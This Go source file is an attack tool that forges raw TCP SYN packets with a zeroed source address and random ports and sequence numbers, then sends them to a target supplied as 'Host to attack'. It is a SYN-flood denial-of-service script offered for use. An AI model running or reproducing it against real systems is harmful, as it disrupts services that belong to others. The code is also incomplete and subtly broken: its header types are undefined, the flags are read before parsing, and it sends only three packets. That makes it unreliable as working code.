package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"syscall"
)

func argParser() (host string, port int) {
	host = *(flag.String("host", "", "Host to attack."))
	port = *(flag.Int("port", 0, "lol"))

	flag.Parse()
	return host, port
}


func main(){
	// Creating argv parsing
	HOST, PORT := argParser()
	log.Printf("Host and Port: {%s:%d}\n", HOST, PORT)

	// Getting IPv4 address of the host
	// If it's invalid value:
	// printing about it in stderror
	AIP := net.ParseIP(HOST).To4()
	if AIP == nil {
		log.Fatal("Invalid Hostname: " + HOST )
	} else {
		handle(AIP, PORT)
	}
}

func handle(ip net.IP, port int) {
	sock, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		log.Fatal(err.Error())
	}

	// Allow to custom IP packets
	err = syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		log.Fatal(err.Error())
	}

	for i := 0; i < 3; i++ {
		go func(){
			srcIp := net.IP(make([]byte, 4))

			ipByte := ipHeader{}
			data, err := ipByte.makeHeader(srcIp, ip)
			if err != nil {
				log.Fatal("Error in unpacking ip byte:\t" + err.Error())
			}

			tcpByte := tcpHeader{}
			tcpData, err := tcpByte.makeHeader(srcIp, ip, port)
			if err != nil {
				log.Fatal("Error in unpacking tcp byte:\t" + err.Error())
			}

			var buff []byte
			buff = append(buff, data...)
			buff = append(buff, tcpData...)

			sockAddr := syscall.SockaddrInet4{}
			sockAddr.Port = port
			copy(sockAddr.Addr[:4], ip)
			fmt.Printf("Sendto %v %v ",ip,port )
			err = syscall.Sendto(sock, buff, 0, &sockAddr)
			if err != nil{
				fmt.Println("Sendto error:\t" + err.Error() )
			}
		}()
	}
	c := make(chan int, 1)
	<- c
}

func (h *ipHeader) makeHeader(srcIp net.IP, dstIp net.IP) ([]byte, error){
	h.PID		= 1
	h.TTL		= 255
	h.Proto		= syscall.IPPROTO_TCP
	h.HCheckSum	= 0
	h.SRCip		= srcIp
	h.DSTip		= dstIp

	return h.Marshal()
}

func (header *tcpHeader) makeHeader(srcIp, destIp net.IP, destPort int) ([]byte, error){
	header.DestPort		= destPort
	header.Flag			= 0x02
	header.AckNum		= 0

	header.Window		= 2048
	header.SourcePort	= rand.Intn(65000)
	header.SeqNum		= rand.Intn(1 << 32 - 1)


	var pseudoH *pseudoHeader = &pseudoHeader{}
	copy(pseudoH.SourceIp[:4], srcIp)
	copy(pseudoH.DestIp[:4], destIp)

	pseudoH.ProtoType	= syscall.IPPROTO_TCP
	pseudoH.SegLen		= uint16(20)
	pseudoH.Fixed 		= 0

	var buffer = bytes.Buffer{}
	if err := binary.Write(&buffer, binary.BigEndian, pseudoH); err != nil {
		log.Fatal("Pseudo Header error")
	}

	tcpBytes, _ := header.Encoding()
	buffer.Write(tcpBytes)
	header.CheckSum = int(CheckSum(buffer.Bytes()))
	return header.Encoding()
}

func CheckSum(data []byte) uint16 {
	var (
		sum    uint32
		length int = len(data)
		index  int
	)
	for length > 1 {
		sum += uint32(data[index])<<8 + uint32(data[index+1])
		index += 2
		length -= 2
	}
	if length > 0 {
		sum += uint32(data[index])
	}
	sum += sum >> 16

	return uint16(^sum)
}